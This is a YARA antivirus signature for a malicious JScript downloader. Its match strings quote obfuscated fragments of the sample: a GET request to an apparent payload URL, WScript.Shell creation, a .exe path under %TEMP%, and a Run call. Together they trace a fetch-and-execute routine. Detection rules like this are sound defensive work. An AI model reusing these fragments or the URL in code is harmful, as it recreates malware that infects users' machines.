rule sig_20160401_83418d5dfbe52cf86b5e7ad29f2f3b6f {
  meta:
    description = "datamaliciousorder - file 20160401_83418d5dfbe52cf86b5e7ad29f2f3b6f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "547eea084471f1c68f566879c1c4805e98edd4e7735bcc394742a36da7406689"

  strings:
    $s1  = "GvVo[EqNim](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "var OsMww = function LpQu() {return WScript[OcuYiw](\"WScript\"+\".Shell\");}(), MkUq = 11;" fullword ascii
    $s3  = "function YqyYv(HvGzu, ZoYb){TkiJnx = TkiJnx * 1; return HvGzu - ZoYb;};" fullword ascii
    $s4  = "if (GvVo[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OsJh() {return OsMww[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yA17eEYcSSg9aQJf.ex\" + \"e\";};" fullword ascii
    $s6  = "function WjiIpa(){return VgwXc + \"\";};" fullword ascii
    $s7  = "function QepGp() {return ((IruWpy == true) && (IruWpy == JqeRi)) ? 1 : TkiJnx;};" fullword ascii
    $s8  = "var LeFr = new this[\"Date\"]();" fullword ascii
    $s9  = "function QrQo(){return OcuYiw;};" fullword ascii
    $s10 = "var YnDu = false;" fullword ascii
    $s11 = "JqeRi = true; " fullword ascii
    $s12 = "function QaJpr(){return 23;};" fullword ascii
    $s13 = "function XxWbp()" fullword ascii
    $s14 = "IruWpy = true; " fullword ascii
    $s15 = "function IvgOj(JrkDa){OsMww[\"R\"+\"un\"](JrkDa, TkiJnx, TkiJnx);};" fullword ascii
    $s16 = "var JqeRi = false;" fullword ascii
    $s17 = "}while (GkDx);" fullword ascii
    $s18 = "IvgOj(ViAl);" fullword ascii
    $s19 = "ViAl = OsJh();" fullword ascii
    $s20 = "var IruWpy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}